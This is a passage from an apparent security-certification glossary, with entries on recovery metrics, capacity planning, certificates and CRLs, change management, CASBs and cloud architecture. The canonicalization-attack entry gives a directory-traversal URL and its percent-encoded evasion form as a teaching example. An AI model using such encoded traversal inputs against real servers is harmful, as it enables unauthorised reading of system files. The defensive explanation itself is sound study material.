For example, a customer relationship management database might be able to sustain the loss of a few hours' or days' worth of data because employees can generally remember who they have contacted and the conversations they had over this time span. Conversely, order processing is generally more time sensitive, as data losses will represent lost orders , and it may be impossible to recapture them or the related processes initiated by order processing systems, such as accounting and fulfillment data.

MTD and RPO help to determine which business functions are critical and also to specify appropriate risk countermeasures. For example, if your RPO is measured in days, then a simple tape backup system should suffice; if RPO is zero or measured in minutes or seconds, a more expensive server cluster backup and redundancy solution will be required.

Mean time to repair (MTTR) and mean time between failures (MTBF) are key performance indicators (KPIs) used to measure the reliability and efficiency of systems, processes, and equipment. Both metrics are important to risk management processes, providing measurable insights into potential risks and supporting risk mitigation strategies. MTTR and MTBF guide decisions regarding system design, maintenance practices, and redundancy or failover requirements.

1. Mean time between failures (MTBF) - It represents the expected lifetime of a product. The calculation for MTBF is the total operational time divided by the number of failures. For example, if you have 10 appliances that run for 50 hours and two of them fail, the MTBF is 250 hours/failure (10*50)/2.

2. Mean time to repair (MTTR) - It is a measure of the time taken to correct a fault so that the system is restored to full operation. This can also be described as mean time to replace or recover. MTTR is calculated as the total number of hours of unplanned maintenance divided by the number of failure incidents. This average value can be used to estimate whether a recovery time objective (RTO) is achievable.

A lower MTTR indicates quicker restoration of functionality, reducing downtime and potential disruptions to operations. This information helps allocate resources, prioritize maintenance activities, and optimize repair processes. MTBF identifies the average time between system or equipment failures. A higher MTBF suggests greater reliability and longer intervals between failures, which can affect maintenance scheduling, spare part management, and overall system performance. Based on MTBF data, organizations can make decisions regarding maintenance strategies, equipment replacement, and investments in improving reliability.
Business Partner - Implies a closer relationship where two companies share quite closely aligned goals and marketing opportunities.
Business Partnership Agreement (BPA) - Agreement by two companies to work together closely, such as the partner agreements that large IT companies set up with resellers and solution providers. Governs long-term strategic partnerships between organizations. BPAs encompass various objectives, including goals, financial arrangements, decision-making processes, intellectual property rights, confidentiality, and dispute-resolution mechanisms. BPAs provide a means for governing collaborative and mutually beneficial relationships.
Cable Locks - Devices can be physically secured against theft using cable ties and padlocks. Some systems also feature lockable faceplates, preventing access to the power switch and removable drives.

Cable locks attach to a secure point on the device chassis. A server chassis might come with both a metal loop and a Kensington security slot. As well as securing the chassis to a rack or desk, the position of the secure point prevents the chassis from being opened without removing the cable first.
Call List - A document listing authorized contacts for notification and collaboration during a security incident.
Canonicalization Attack - An attack method where input characters are encoded in such a way as to evade vulnerable input validation measures.

The threat actor might use a canonicalization attack to disguise the nature of the malicious input. Canonicalization refers to the way the server converts between the different methods by which a resource may be represented and submitted to the simplest (or canonical) method used by the server to process the input. Examples of encoding schemes include HTML entities and character set percent encoding. An attacker might be able to exploit vulnerabilities in the canonicalization process to perform code injection or facilitate directory traversal. For example, to perform a directory traversal attack, the attacker might submit a URL such as the following :

http://victim.foo/?show=../../../../etc/config

A limited input validation routine would prevent the use of the string ../ and refuse the request. If the attacker submitted the URL using the encoded version of the characters, they might be able to circumvent the validation routine:

http://victim.foo/?show=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/config
Capacity Planning - A practice which involves estimating the personnel, storage, computer hardware, software, and connection infrastructure resources required over some future period of time.

Capacity planning is a critical process in which organizations assess their current and future resource requirements to ensure they can efficiently meet their business objectives. This process involves evaluating and forecasting the necessary resources in terms of people, technology, and infrastructure to support anticipated growth, changes in demand, or other factors that may impact operations. For people, capacity planning considers the number of employees, their skill sets, and the potential need for additional training or hiring to meet future demands. This may involve evaluating workforce productivity, analyzing staffing levels, and identifying potential skills gaps. In terms of technology, capacity planning encompasses the assessment of hardware, software, and network resources required to support business operations, taking into account factors such as performance, scalability, and reliability.

Organizations must ensure they have the right technology resources in place to handle increasing workloads and support new applications or services. When it comes to infrastructure, capacity planning involves evaluating physical facilities, such as datacenters and office spaces, to determine whether they can accommodate projected growth and maintain business continuity. This may include considerations for power, cooling, and connectivity, as well as planning for potential expansion or relocation. Organizations use various capacity planning methods, including trend analysis, simulation modeling, and benchmarking, to help forecast their needs. Trend analysis examines historical data to identify patterns and trends in resource usage, demand, and performance. Organizations can forecast future resource requirements by understanding past patterns. This type of analysis can help identify potential bottlenecks or other areas that require attention. Simulation modeling leverages computer-based models to simulate real-world scenarios. Organizations can assess the impact of changes in demand, different resource allocation strategies, or system configurations to make informed decisions and optimize resource allocation to meet anticipated needs. Benchmarking requires a comparison of an organization's performance metrics against industry standards or best practices. Benchmarking provides a comparatively simple way to identify areas for improvement and establish performance targets. Ultimately, effective capacity planning allows organizations to optimize resource allocation, reduce costs, and minimize the risk of downtime or performance issues, ensuring they can continue to meet their business goals and maintain a competitive edge.

People Risks Associated with Capacity Planning
People risks associated with capacity planning may include insufficient staffing or skills gaps, leading to inadequate resource allocation or ineffective utilization. Lack of cross-training or succession planning can create dependency on specific individuals, increasing vulnerability to disruptions. Additionally, resistance to change, lack of employee engagement, or ineffective communication can hinder successful security operations.

1. Cross-Training - Requires employees to develop skills and knowledge outside their primary roles to mitigate the risk of relying heavily on specific individuals or teams. By cross-training employees, organizations can ensure that multiple individuals can perform critical tasks, reducing the dependence on a single employee or team. Cross-training promotes flexibility, resilience, and continuity within the workforce.

2. Remote Work Plans - Outline strategies for employees to work effectively outside the traditional office environment. Remote work plans define communication channels, technology requirements, and expectations for remote work arrangements. Established remote work plans allow organizations to seamlessly transition to remote operations, ensuring business continuity and minimizing the impact of disruptions.

3. Alternative Reporting Structures - Describe backup or temporary reporting relationships to reduce the risk associated with single points of failure in management or decision-making. Organizations can maintain operations and decision-making even if key personnel are unavailable by identifying interim individuals or teams.
Effective communication is paramount in reducing risk during disruptive events. Clear and timely communication channels ensure that employees, stakeholders, and customers receive accurate information, instructions, and updates. Clear communication helps manage expectations, reduce confusion, and facilitate coordinated responses. Communication fosters trust, promotes employee engagement, and ensures everyone is aligned with the organization's response plans. Additionally, communication plays a vital role in disseminating information about alternative work arrangements, changes in reporting structures, and other critical updates during a disruptive event.

Technologies and software associated with remote work:

1. Virtual Private Network (VPN) - Provides secure access to an organization's internal network and resources.

2. Remote Desktop Software - Allows remote access to computers or virtual desktops in the office or the tools used by the help desk and service-center teams to support employees.

3. Cloud-Based Tools - Platforms like Microsoft 365, Google Workspace, Dropbox, Slack, and many other popular tools enable remote team collaboration, document sharing, and communication.

4. Video Conferencing Software - Applications like Zoom, Microsoft Teams, or Webex facilitate virtual meetings, conference calls, and screen sharing.

5. Instant Messaging and Chat Tools - Applications like Slack, Microsoft Teams, or Discord enable real-time communication and quick collaboration.

6. Virtual Phone Systems - Cloud-based phone systems allow employees to make and receive calls remotely using their computers or mobile devices.

7. Project Management Tools - Platforms like Trello, Asana, or Jira assist in task management, project tracking, and team coordination.

Changes in Workforce Capacity
Layoffs can introduce a range of cybersecurity and physical risks to an organization, making it crucial to consider these factors within capacity planning efforts. Disgruntled employees may pose a significant cybersecurity risk, potentially engaging in unauthorized access or misuse of sensitive data and systems. Additionally, the loss of experienced employees may result in insufficient knowledge transfer to the remaining staff, leading to security gaps and misconfigurations. Furthermore, improper revocation of access to systems and data for laid-off employees can leave organizations vulnerable.

In terms of physical risks, departing employees may resort to theft or sabotage of physical assets or exploit their knowledge of safety protocols and procedures to compromise the organization's security. Unauthorized access to premises is another concern if access credentials are not revoked promptly.

Capacity planning is essential in managing these risks. It enables organizations to assess resource requirements and make strategic decisions about staffing levels and resource allocation. By incorporating potential layoffs into capacity planning, organizations can proactively prepare for the associated risks and minimize their impact. Implementing robust offboarding procedures, ensuring proper knowledge transfer, and maintaining a strong security culture among remaining employees are crucial in mitigating risks. In conclusion, considering the potential risks associated with layoffs during capacity planning helps organizations maintain a secure environment and protect their valuable assets.

Other Risks Associated with Poor Capacity Planning
Poor capacity planning regarding technology and infrastructure can have significant consequences for an organization's cybersecurity and physical security. Overloaded systems resulting from inadequate capacity planning can increase susceptibility to crashes, failures, and denial of service (DoS) attacks. Additionally, limited resources may lead to performance degradation, potentially causing organizations to neglect essential security measures and updates. Failing to invest in the right security technologies or maintain the necessary infrastructure to protect against emerging threats leaves organizations more vulnerable to cyberattacks.

Physically, poor capacity planning may result in insufficient investment in security measures such as access control systems, surveillance cameras, or secure facilities, exposing organizations to unauthorized access or theft. Overlooking capacity requirements for power and cooling can cause overheating or power failures in datacenters, leading to hardware failures, data loss, or downtime. Furthermore, inadequate planning for future growth can limit an organization's ability to scale its operations, potentially affecting its responsiveness to security incidents or implementation of new security measures.

In contrast, overestimating capacity needs during capacity planning can negatively impact an organization. Increased costs from unnecessary expenses on technology, infrastructure, and personnel, strain budgets and divert funds from other critical areas. Inefficient resource utilization can lead to low utilization rates, which can negatively affect the return on investment (ROI) and overall operational effectiveness. Overestimating capacity needs can contribute to higher energy consumption, driving up costs and increasing the organization's carbon footprint and environmental impact.

Deploying more resources than necessary can introduce increased complexity in managing and maintaining technology and infrastructure. This added complexity could create challenges for IT teams, making it more difficult to identify and resolve issues or optimize performance. Additionally, the opportunity cost of investing in excess capacity can be significant, as resources may be diverted from other essential projects or initiatives, potentially hindering innovation or market growth.

To avoid these potential problems, organizations must strive for a balanced approach to capacity planning, considering current and future needs while remaining flexible and adaptable to changing circumstances. Regularly reviewing and updating capacity plans, along with employing techniques such as monitoring, forecasting, and resource scaling, can help organizations optimize resource allocation and mitigate the risks associated with overestimating capacity needs.
Card Cloning (RFID) - Making a copy of a contactless access card.

This refers to making one or more copies of an existing card. A lost or stolen card with no cryptographic protections can be physically duplicated. Card loss should be reported immediately so that it can be revoked and a new one issued. If there was a successful attack, it might be indicated by use of a card in a suspicious location or time of day.
Cellular - Standards for implementing data access over cellular networks are implemented as successive generations. For 2G (up to about 48 Kb/s) and 3G (up to about 42 Mb/s), there are competing GSM and CDMA provider networks. Standards for 4G (up to about 90 Mb/s) and 5G (up to about 300 Mb/s) are developed under converged LTE standards.
Centralized Computing Architecture - A model where all data processing and storage is performed in a single location.

Centralized computing architecture refers to a model where all data processing and storage is performed in a single location, typically a central server. All users and devices rely on the central server to access and process data and depend upon the server administrator and controlling organization's trustworthiness regarding security and privacy decisions. Examples of centralized computing architecture include mainframe computers and client-server architectures.
Centralized Web Filtering - A centralized proxy server plays a crucial role in web content filtering by acting as an intermediary between end users and the Internet. When an organization routes Internet traffic through a centralized proxy server, it can effectively control and monitor all inbound and outbound web content. The primary role of the proxy in web content filtering is to analyze web requests from users and determine whether to permit or deny access based on established policies. The proxy can block access to specific URLs, IP addresses, or categories of websites, such as social media platforms, gambling sites, or sites known for distributing malware.

Beyond blocking unwanted or harmful content, a centralized proxy server can also perform detailed logging and reporting of web activity to allow security analysts to track and analyze web usage patterns, identify policy violations, and gather valuable intelligence for refining filtering policies and rules. A centralized proxy server can provide additional security benefits, such as anonymizing requests and caching web content for improved performance.

A centralized proxy server employs various techniques to protect web traffic and ensure the safety of an organization's network, including the following:

1. URL Scanning - Where the proxy server examines the URLs requested by users. It can block access to specific URLs known to host malicious content, be inappropriate, or violate the company's Internet usage policy.

2. Content Categorization - Classifies websites into various categories, such as social networking, gambling, adult content, webmail, and many others. Organizations can define rules to allow or deny access based on these categories, providing a flexible way to enforce web usage policies.

3. Block Rules - Use the proxy server to implement block rules based on various factors such as the website's URL, domain, IP address, content category, or even specific keywords within the web content. For example, an organization could block all .exe downloads to prevent the accidental download of potentially harmful files.

4. Reputation-Based Filtering - Uses proxy servers to incorporate reputation-based filtering, which leverages continually updated databases that score websites based on their observed behavior and history. Sites known for hosting malware, engaging in phishing attacks, or distributing spam, for instance, would have a poor reputation score and could be automatically blocked.
Certificate Authority (CA) - A server that guarantees subject identities by issuing signed digital certificate wrappers for their public keys.
Certificate Chaining / Chain of Trust - A method of validating a certificate by tracing each CA that signs the certificate, up through the hierarchy to the root CA. Also referred to as chain of trust.
Certificate Revocation List (CRL) - A list of certificates that were revoked before their expiration date.

A certificate may be revoked or suspended:

1. A revoked certificate is no longer valid and cannot be "un-revoked" or reinstated.

2. A suspended certificate can be re-enabled.

A certificate may be revoked or suspended by the owner or by the CA for many reasons. For example, the private key may have been compromised, the business could have closed, a user could have left the company, a domain name could have been changed, the certificate could have been misused, and so on. These reasons are codified under choices such as Unspecified, Key Compromise, CA Compromise, Superseded, or Cessation of Operation. A suspended key is given the code Certificate Hold.

There must be a mechanism to inform users whether a certificate is valid, revoked, or suspended. A CA must maintain a certificate revocation list (CRL) of all revoked and suspended certificates. The CRL must be accessible to anyone relying on the validity of the CA's certificates. Each certificate should contain information for the browser on how to check the CRL.

A CRL has the following attributes:

1. Publish Period - the date and time on which the CRL is published. Most CAs are set up to publish the CRL automatically.

2. Distribution Point(s) - the location(s) to which the CRL is published.

3. Validity Period - the period during which the CRL is considered authoritative. This is usually a bit longer than the publish period (for example, if the publish period was every 24 hours, the validity period might be 25 hours).

5. Signature - the CRL is signed by the CA to verify its authenticity.

With the CRL system, there is a risk that the certificate might be revoked but still accepted by clients because an up-to-date CRL has not been published. A further problem is that the browser (or other application) may not be configured to perform CRL checking, although this now tends to be the case only with legacy browser software.

Another means of providing up-to-date information is to check the certificate's status on an Online Certificate Status Protocol (OCSP) server . Rather than return a whole CRL, this communicates requested certificate's status. Details of the OCSP responder service should be published in the certificate.

Most OCSP servers can query the certificate database directly and obtain the real-time status of a certificate. Other OCSP servers actually depend on the CRLs and are limited by the CRL publishing interval.
Certificate Signing Request (CSR) - A Base64 ASCII file that a subject sends to a CA to get a certificate.

The CSR is a file containing the information that the subject wants to use in the certificate, including its public key.

The CA reviews the certificate and checks that the information is valid. For a web server, this may simply mean verifying that the subject name and fully qualified domain name (FQDN) are identical, and verifying that the CSR was initiated by the person administratively responsible for the domain, as identified in the domain's WHOIS records. If the request is accepted, the CA signs the certificate and sends it to the subject.
Certificate-Based Authentication - The supplicant controls a private key that can generate a unique signed token. The identity provider can verify the signature via the public key. The main drawback of this approach is the administrative burden of implementing PKI to issue digital certificates.
Change Control - The process by which the need for change is recorded and approved.

Configuration management ensures that each configurable element within an asset inventory has not diverged from its approved configuration. Change control and change management reduce the risk that changes to these components could cause an interruption to the organization's operations.
Change Management - The process through which changes to the configuration of information systems are implemented as part of the organization's overall configuration management efforts. Configuration management ensures that each configurable element within an asset inventory has not diverged from its approved configuration. Change control and change management reduce the risk that changes to these components could cause an interruption to the organization's operations. Change management policies outline how changes to IT systems and software are requested, reviewed, approved, and implemented, including all documentation requirements.	

Change management plays a vital role in an organization's security operations. It refers to a systematic approach that manages all changes made to a product or system, ensuring that methods and procedures are used to handle these changes efficiently and effectively. This helps minimize risks associated with the changes, ensuring they do not negatively impact the organization's security posture, service availability, or performance.

A non-comprehensive list of changes typically managed in a change management program includes the following:

1. Software deployments

2. System updates

3. Software patching

4. Hardware replacements or upgrades

5. Network modifications

6. Changes to system configurations

7. New product implementations

8. New software integrations

9. Changes and refreshes to support environments

If not properly managed, these changes can introduce new vulnerabilities into the system, disrupt services, or negatively impact the organization's compliance status. A robust change management program allows all changes to be tracked, assessed, approved, and reviewed. Each change must include documentation, including details describing what will be changed, the reasons for the change, any potential impacts, and a rollback plan in case the change does not work as planned. Each change must be subject to risk assessment to identify potential security impacts. Appropriate personnel must approve changes before implementation to ensure accountability and ensure changes align with business priorities.

After implementations, changes must be reviewed and audited to ensure they have been completed correctly and achieved their stated outcome without compromising security. Systematic management of changes supports an organization's ability to reduce unexpected downtime and system vulnerabilities. Change management programs contribute to operational resilience by ensuring that changes support business objectives without compromising security or compliance.

A typical change management approval process involves several stages designed to ensure proper assessment and approval of change proposals. Change requests usually begin with submitting a request for change (RFC) that outlines the details of the proposed change, including its purpose, scope, and potential impact. The change request is reviewed by a designated change manager or committee that assesses its feasibility, risks, alignment with organizational objectives, and policy compliance. Following initial review, the change request undergoes a formal approval process involving relevant stakeholders, such as management, IT teams, and any impacted departments, to ensure consensus and authorization before the change is implemented. Throughout the process, documentation and communication are crucial in tracking the status and outcome of approved changes.

Factors Driving Change Management
Change management requires the expertise of individuals from various parts of an organization to oversee and implement changes effectively. Examples include IT professionals with technical knowledge, business leaders with operational knowledge, and compliance officers with legal expertise. The involvement of these stakeholders (A person who has a business interest in the outcome of a project or is actively involved in its work. Includes anyone with a vested interest in the change or project being implemented or developed) facilitates a comprehensive review of proposed changes helping to identify non-obvious risks and identify effective implementation plans that minimize risks and business disruptions. Additionally, including diverse stakeholders promotes acceptance and adoption of the changes because they were involved in the planning and decision-making process. Stakeholder participation fosters ownership and responsibility, which are crucial for successful change implementation.

Ownership in change management refers to individuals or groups that are primarily responsible for implementing a specific change. Owners can be project managers, team leaders, or anyone responsible for the change. Owners are accountable for ensuring that the change is implemented as planned, risks are managed effectively, and there's a clear plan for communication and training associated with the change. They also ensure that all stakeholders appropriately review and approve the proposed change. Stakeholders in the change management process describe the individuals or groups impacted (or interested) in the change and include employees, managers, the Change Advisory Board (CAB), and sometimes even customers, vendors, and partners. Stakeholder engagement is critical to successful change management because keeping stakeholders informed about changes, understanding their concerns, and addressing their needs improves the likelihood of the change being accepted and implemented smoothly.

Change Management Concepts:

1. Impact Analysis - This is the process of identifying and assessing the potential implications of a proposed change, including how the change will impact individual users, business processes, or interconnected systems.

2. Test Results - Before implementation, changes must first be evaluated in a test environment to ensure they work as intended and do not cause issues. Test results provide valuable insight into the likelihood of success and help identify potential issues without impacting business operations.

3. Backout Plans - A backout plan is a contingency plan for reversing changes and returning systems and software to their original state if the implementation plan fails. A well-defined backout plan helps to minimize downtime and reduces the risk of data loss or other severe impacts.

4. Maintenance Windows - A maintenance window is a predefined, recurring time frame for implementing changes. They are typically scheduled during periods of low activity to minimize business disruptions.

5. Standard Operating Procedures (SOPs) - These are detailed, written instructions that describe how to carry out routine operations or changes. In change management, SOPs ensure that changes are implemented consistently and effectively. They are generally developed during testing phases and provide detailed steps for employees tasked with implementing a change to help reduce errors.
Chaotic Motivation - In the early days of the Internet, many service disruption and disinformation attacks were perpetrated with the simple goal of causing chaos. Hackers might deface websites or release worms that brought corporate networks to a standstill for no other reason than to gain credit for the hack. This type of vandalism for its own sake is less prevalent now. Attackers might use service disruption and disinformation to further political ends, or nation-states might use it to further war aims. Another risk is threat actors motivated by revenge. Revenge attacks might be perpetrated by an employee or former employee or by any external party with a grievance.
Chief Information Officer (CIO) - A company officer with the primary responsibility for management of information technology assets and procedures.
Chief Security Officer (CSO) - Typically the job title of the person with overall responsibility for information assurance and systems security.
Chief Technology Officer (CTO) - A company officer with the primary role of making effective use of new and emerging computing platforms and innovations.
chmod - Linux command for managing file permissions.
Choose Your Own Device (CYOD) - Enterprise mobile device provisioning model where employees are offered a selection of corporate devices for work and, optionally, private use.
Cipher Suite - Lists of cryptographic algorithms that a server and client can use to negotiate a secure connection.

A cipher suite is the algorithms supported by both the client and server to perform the different encryption and hashing operations required by the protocol. Prior to TLS 1.3, a cipher suite would be written in the following form:

ECDHE-RSA-AES128-GCM-SHA256

This means that the server can use Elliptic Curve Diffie-Hellman Ephemeral mode for session key agreement, RSA signatures, 128-bit AES-GCM (Galois Counter Mode) for symmetric bulk encryption, and 256-bit SHA for HMAC functions. Suites the server prefers are listed earlier in its supported cipher list.

TLS 1.3 uses simplified and shortened suites. A typical TLS 1.3 cipher suite appears as follows:

TLS_AES_256_GCM_SHA384

Only ephemeral key agreement is supported in 1.3 and the signature type is supplied in the certificate, so the cipher suite only lists the bulk encryption key strength and mode of operation (AES_256_GCM), plus the cryptographic hash algorithm (SHA384) used within the new hash key derivation function (HKDF). HKDF is the mechanism by which the shared secret established by D-H key agreement is used to derive symmetric session keys.
Ciphertext - Data that has been enciphered and cannot be read without the cipher key. It is an encrypted message.
Clean Desk Policy - An organizational policy that mandates employee work areas be free from potentially sensitive information; sensitive documents must not be left out where unauthorized personnel might see them.

A clean desk policy means that each employee's work area should be free from any documents left there. The aim of the policy is to prevent sensitive information from being obtained by unauthorized staff or guests at the workplace.
Client-Based Scanning - A vulnerability scanning approach where dedicated software is installed directly on each host being monitored. The agent runs locally as a persistent process, performing scans and reporting results back to a centralized management server. This method provides deeper visibility into the system's configuration and can continue monitoring even when the device is off-network, though it requires installation and ongoing maintenance across all endpoints.
Client-Side / Server- Side Validation - A web application (or any other client-server application) can be designed to perform code execution and input validation locally (on the client) or remotely (on the server). An example of client-side execution is a document object model (DOM) script to render the page using dynamic elements from user input. Applications may use both techniques for different functions. The main issue with client-side validation is that the client will always be more vulnerable to some sort of malware interfering with the validation process. The main issue with server-side validation is that it can be time-consuming, as it may involve multiple transactions between the server and client. Consequently, client-side validation is usually restricted to informing the user that there is some sort of problem with the input before submitting it to the server. Even after passing client-side validation, the input will still undergo server-side validation before it can be posted (accepted). Relying on client-side validation only is poor programming practice.
Closed / Proprietary - Software code or security research that remains in the ownership of the developer and may only be used under permitted license conditions.
Cloud Access (Network Vector) - Many companies now run part or all of their network services via Internet-accessible clouds. The attacker only needs to find one account, service, or host with weak credentials to gain access. The attacker is likely to target the accounts used to develop services in the cloud or manage cloud systems. They may also try to attack the cloud service provider (CSP) as a way of accessing the victim system.
Cloud Access Security Brokers (CASB) - Enterprise management software designed to mediate access to cloud services by users across all types of devices.

A cloud access security broker (CASB) is enterprise management software designed to mediate access to cloud services by users across all types of devices. CASB vendors include Symantec, Skyhigh Security, Forcepoint, Microsoft Cloud App Security, and Cisco Cloudlock.

CASBs provide visibility into how clients and other network nodes are using cloud services. Some of the functions of a CASB are the following:

1. Enable single sign-on authentication and enforce access controls and authorizations from the enterprise network to the cloud provider.

2. Scan for malware and rogue or noncompliant device access.

3. Monitor and audit user and resource activity.

4. Mitigate data exfiltration by preventing access to unauthorized cloud services from managed devices.

In general, CASBs are implemented in one of three ways:

1. Forward proxy - Is a security appliance or host positioned at the client network edge that forwards user traffic to the cloud network if the contents of that traffic comply with a policy. This requires configuration of users' devices or installation of an agent. In this mode, the proxy can inspect all traffic in real time, even if that traffic is not bound for sanctioned cloud applications. The problem with this mode is that users may be able to evade the proxy and connect directly. Proxies are also associated with poor performance as without a load balancing solution, they become a bottleneck and potentially a single point of failure.

2. Reverse proxy - Is positioned at the cloud network edge and directs traffic to cloud services if the contents of that traffic comply with a policy. This does not require configuration of the users' devices. This approach is only possible if the cloud application has proxy support.

3. Application programming interface (API) - Brokers connections between the cloud service and the cloud consumer rather than placing a CASB appliance or host inline with cloud consumers and the cloud services. For example, if a user account has been disabled or an authorization has been revoked on the local network, the API-based CASB would communicate this to the cloud service and use its API to disable access there too. This depends on the API supporting the range of functions that the CASB and access and authorization policies demand. CASB solutions are quite likely to use both proxy and API modes for different security management purposes.
Cloud Architecture Features - Public cloud infrastructure provides a wide range of available features to ensure high uptime and minimal downtime for its customers. Data replication and redundancy are among the key features, as public cloud providers replicate data across multiple servers and datacenters to ensure data availability in the event of a server or datacenter failure. Auto-scaling is also a critical feature that allows resources to scale automatically based on demand, ensuring that applications can handle high traffic volumes without downtime.

Public cloud providers offer disaster recovery services, including monitoring and alerting tools, to proactively detect and respond to any issues that could impact availability. Public cloud providers also typically offer service-level agreements (SLAs) that guarantee a certain level of uptime and availability, including credits or refunds if the provider fails to meet availability commitments.

Considerations

1. Cost - Should focus on solutions that best achieve operational goals while maintaining the confidentiality, integrity, and availability of data, not simply cost in cloud adoption. There are several cost models associated with running services in the cloud, such as consumption-based or subscription-based, and most cloud providers have tools designed to help estimate costs for migrating existing workloads from on-premises to cloud. Using cloud services involves a shift from capital expenses (CapEx) to operational expenses (OpEx). CapEx includes up-front costs for purchasing hardware, software licenses, and infrastructure setup in traditional on-premises IT infrastructure.

In contrast, cloud services are typically paid on a pay-as-you-go basis, allowing organizations to convert CapEx into OpEx. Cloud services charge for usage and resource consumption, eliminating the need for significant up-front investments. This OpEx model provides flexibility, scalability, and cost optimization as organizations pay only for the resources they use, making cloud services more cost-effective from the viewpoint that they align expenses with actual usage. However, resources not optimized to run on cloud infrastructure can present significant challenges to the benefits this model advertises and generate overbearing recurring costs.

2. Scalability - Is one of the most valuable and compelling features of cloud computing. It is the ability to dynamically expand and contract capacity in response to demand with no downtime. There are two basic ways in which services can be scaled. Scale-up (vertical scaling) describes adding capacity to an existing resource, such as a processor, memory, and storage capacity. Scale-out (horizontal scaling) describes adding additional resources, such as more instances (or virtual machines) to work in parallel and increase performance.

3. Resilience - Cloud providers use redundant hardware, fault tolerance capabilities (such as clustering), and data replication to store data across multiple servers and datacenters, ensuring that data remains available if one server or datacenter fails.

4. Ease of deployment - Cloud features supporting ease of deployment include automation, standardization, and portability.

i. Automating the deployment and management of cloud resources reduces the need for manual intervention and is often achieved using configuration management, container orchestration, and infrastructure as code.

ii. Standardized configurations, templates, and images simplify deployment and ensure consistency.

iii. Portability ensures that applications and services can be easily moved between different cloud infrastructures, avoiding vendor lock-in and providing greater flexibility.

5. Ease of recovery - Cloud providers typically offer backup and restore functionality to allow organizations to schedule automated backups and quickly restore data in case of accidental deletion, corruption, or system failures. Cloud providers often implement highly redundant and fault-tolerant architectures, distribute data and services across multiple datacenters or availability zones, and reduce the risk of data loss or service disruption by ensuring that workloads seamlessly failover if one datacenter or zone experiences an outage. Additionally, cloud providers offer disaster recovery services that enable organizations to replicate their environments in different geographic regions to provide failover capabilities in the event of a catastrophe.

6. SLA and ISA - Service level agreements (SLAs) define expected service levels, including performance, availability, and support commitments between cloud service providers and organizations. It is essential to carefully review and negotiate SLAs to ensure they align with business requirements and adequately protect the organization's interests. Interconnection Security Agreements (ISAs) establish the security requirements and responsibilities between the organization and the cloud service provider to safeguard sensitive data and ensure compliance with industry regulations to help ensure the confidentiality, integrity, and availability of data and systems within the cloud environment. ISAs help ensure data and system protection within the cloud environment and define encryption methods, access controls, vulnerability management, and data segregation techniques. The agreement must also specify data ownership, audit rights, and data backup, recovery, and retention procedures. Regulated industries must ensure that their cloud service provider complies with relevant regulations, such as GDPR, HIPAA, or PCI DSS, and the ISA must detail how the provider meets these compliance requirements and include provisions for auditing and reporting to demonstrate ongoing compliance. Additionally, the ISA should address the use of subcontractors and clearly define the security responsibilities and requirements for their selection and the process for notifying the organization of subcontractor changes.

Disaster recovery planning is still essential and should include procedures for restoring critical systems, data, and applications and communicating with customers and other stakeholders. Additionally, testing and validation, service-level agreements, and incident response procedures must all be carefully considered when evaluating the ease of recovery of cloud infrastructure.

7. Power - Cloud providers prioritize energy efficiency to reduce costs and environmental impact by deploying energy-efficient hardware, optimizing cooling systems, and implementing power management techniques. Additionally, redundant power infrastructure ensures high availability and is enabled using multiple power feeds, backup generators, and UPS systems to prevent service disruptions. Power monitoring and management systems enable cloud providers to track real-time power consumption within datacenters. These systems can help to optimize resource allocation, identify energy-intensive infrastructure, and facilitate load balancing. Scalability in power provisioning refers to a provider's ability to dynamically allocate power resources based on customer demand. Power usage effectiveness (PUE) is a metric used to measure datacenter energy efficiency. Cloud providers strive for low PUE values, indicating efficient utilization of energy. A lower PUE signifies that a larger proportion of the energy supplied to the datacenter is used for computing purposes rather than supporting infrastructure.

8. Compute - Compute capabilities in cloud architecture provide the flexibility, scalability, and efficiency necessary to manage and utilize computing resources. Compute capabilities include elasticity, resource pooling, orchestration, automation, and serverless computing, which contribute to delivering highly available, scalable, and cost-effective computing environments in the cloud. Virtual networks facilitate secure communication and traffic routing, while load balancing distributes network traffic to optimize resource utilization and improve performance. Networking also enables private and public connectivity, allowing organizations to establish secure connections between on-premises infrastructure and cloud resources and enabling external access to cloud-based applications. Additionally, networking supports scalable and distributed architectures, enabling fault tolerance, high availability, and efficient content delivery through specialized services such as content delivery networks (CDNs).
Cloud Automation Technologies - Infrastructure as Code
Infrastructure as Code (IaC) is a software engineering practice that manages computing infrastructure using machine-readable definition files. These files contain code written in a specific format that can be read and executed by machines. These files manage and provision computing infrastructure. Machine-readable definition files are written in formats like YAML, JSON, and HCL (HashiCorp Configuration Language.) They contain information about the desired infrastructure state, including configuration settings, networking requirements, security policies, and other settings. By using machine-readable definition files, infrastructure can be deployed and managed automatically and consistently, reducing the risk of errors caused by manual intervention.

These files are typically version-controlled and can be treated like any other code in a software project. IaC allows developers and operations teams to automate the process of deploying and managing infrastructure, reducing the likelihood of errors and inconsistencies that can arise from manual configuration. By using IaC, teams can also easily replicate infrastructure across different environments, such as development, staging, and production, and ensure that their infrastructure configuration is consistent and reproducible.

HCL (HashiCorp Configuration Language) is a configuration language developed by HashiCorp and used in Infrastructure as Code (IaC) environments to manage and provision computing infrastructure. HCL is similar to JSON and YAML in terms of syntax, but it has some additional features that make it more suitable for infrastructure management. It supports variables inside configuration files and has a concise syntax that makes it easy to read and write. HCL is used in many popular HashiCorp tools, including Terraform and Consul.

Responsiveness
Load balancing, edge computing, and auto-scaling are critical mechanisms to ensure responsiveness, improve performance, and effectively handle fluctuating workloads.

1. Load Balancing - Distributes network traffic across multiple servers or services to improve performance and provide high availability. In the cloud, load balancers are intermediaries (proxies) between users and back-end resources like virtual machines or containers. They distribute incoming requests to different resources using sophisticated algorithms and handle server capacity, response time, and workload.

2. Edge Computing - Optimizes the geographic location of resources and services to enable faster processing and reduced latency. Instead of routing all data to a centralized cloud datacenter, edge computing utilizes distributed computing resources to minimize the distance data needs to travel, reducing network latency and improving responsiveness. Edge computing is particularly beneficial for applications that require real-time or low-latency processing, such as IoT devices, content delivery networks (CDNs), and latency-sensitive applications.

3. Auto-Scaling - Is an automated process that adjusts the computing resources allocated to an application based on demand. Auto-scaling allows cloud infrastructure to dynamically scale resources up or down to match the real-time workload requirements. For example, during periods of high demand, additional resources are provisioned automatically to handle the increased load, ensuring optimal performance and responsiveness. In contrast, when demand decreases, unnecessary resources are released back into a shared pool to reduce operating costs or to make them available to other workloads.

These mechanisms optimize resource utilization, reduce latency, and allow infrastructure to adapt on demand to changing workload patterns, resulting in a highly responsive and efficient cloud environment.
Cloud Computing - Computing architecture where on-demand resources provisioned with the attributes of high availability, scalability, and elasticity are billed to customers on the basis of metered utilization.
